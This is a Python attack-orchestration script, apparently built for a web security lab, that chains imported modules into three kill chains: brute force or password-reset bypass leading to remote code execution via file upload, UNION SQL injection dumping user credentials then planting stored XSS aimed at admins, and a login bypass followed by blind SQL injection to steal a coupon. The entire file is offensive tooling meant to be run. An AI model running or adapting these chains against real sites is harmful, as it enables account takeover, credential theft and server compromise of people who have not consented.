import sys

import enum_and_brute
import Broken_Password_Reset
import rce_upload_exploit
import SQLi_UNION
import stored_xss
import SQLi
import SQLi_Blind

def chain_1_rce():
    print("\n" + "="*60)
    print("CHAIN 1: FULL AUTOMATED RCE (Discovery -> Access -> Control)")
    print("="*60)
    
    # Phase 1: User Discovery & Initial Brute Force
    # run_attack returns a list of (user, password) that were successfully cracked
    print("[*] Phase 1: Running Discovery and Brute Force...")
    cracked_accounts = enum_and_brute.run_attack()
    
    target_user = None
    target_pwd = None

    if cracked_accounts:
        # If we found a working password immediately, we use it
        target_user, target_pwd = cracked_accounts[0]
        print(f"[+] Found working credentials via Brute Force: {target_user}:{target_pwd}")
    else:
        # Phase 2: Targeted Logic Bypass (If Brute Force failed)
        # We need a username to attack. Let's assume we use 'carlos' as a fallback 
        # or we could modify run_attack to return found users even if not cracked.
        print("[-] Brute Force failed to find a password. Falling back to Logic Bypass...")
        target_user = "carlos" # Primary target for the reset exploit
        target_pwd = Broken_Password_Reset.run_reset_password(user=target_user)

    # Phase 3: Remote Code Execution
    if target_user and target_pwd:
        print(f"[*] Phase 3: Launching RCE on account: {target_user}")
        rce_upload_exploit.run_ultimate_rce(username=target_user, password=target_pwd)
    else:
        print("[-] Chain 1 failed: No access gained to any account.")

def chain_2_breach():
    print("\n" + "="*60)
    print("CHAIN 2: DATA BREACH TO XSS (Union SQLi -> Stored XSS)")
    print("="*60)
    
    # Phase 1: Database Exfiltration
    # Use UNION-based SQL Injection to dump the entire users table
    users = SQLi_UNION.dump_users()
    
    if users:
        # Phase 2: Post-Exploitation / Lateral Movement
        # Select the first compromised account from the database dump
        target_user, target_pwd = users[0]
        print(f"[*] Using stolen credentials: {target_user}")
        
        # Phase 3: Stored XSS Injection
        # Use the stolen credentials to log in and plant a malicious XSS payload
        # This will compromise other users (like admins) visiting the site
        stored_xss.perform_stored_xss(username=target_user, password=target_pwd)
    else:
        print("[-] Chain 2 failed: SQLi Union returned no data.")


def chain_3_stealth():
    print("\n" + "="*60)
    print("CHAIN 3: STEALTH LEAK (Login Bypass -> Blind SQLi)")
    print("="*60)
    
    # 1. Bypass login and get the session ID
    sid = SQLi.sql_login_bypass()
    
    if sid:
        # 2. Directly update the cookie in your existing script
        SQLi_Blind.COOKIES['PHPSESSID'] = sid
        
        # 3. Run your existing functions in order
        baseline = SQLi_Blind.get_baseline()
        
        # You can choose to discover the table or go straight to leaking
        table = SQLi_Blind.discover_table_name(baseline)
        
        if table:
            # Call your original leaking function
            coupon = SQLi_Blind.leak_data_unlimited(table, "encrypted_code", baseline)
            print(f"\n[!!!] SUCCESS: Stolen VIP Coupon: {coupon}")
    else:
        print("[-] Chain 3 failed: Login bypass did not work.")

        
def main():
    if len(sys.argv) < 2:
        print("\n[!] Error: No chain selected.")
        print("Usage: python master_kill_chain.py [1/2/3]")
        print("  1: Full RCE Chain (Enum -> Reset -> RCE)")
        print("  2: Information Leak Chain (Union SQLi -> Stored XSS)")
        print("  3: Stealth Secret Chain (Bypass -> Blind SQLi)")
        return

    choice = sys.argv[1]
    if choice == "1":
        chain_1_rce()
    elif choice == "2":
        chain_2_breach()
    elif choice == "3":
        chain_3_stealth()
    else:
        print("[!] Invalid selection. Please choose 1, 2, or 3.")

if __name__ == "__main__":
    main()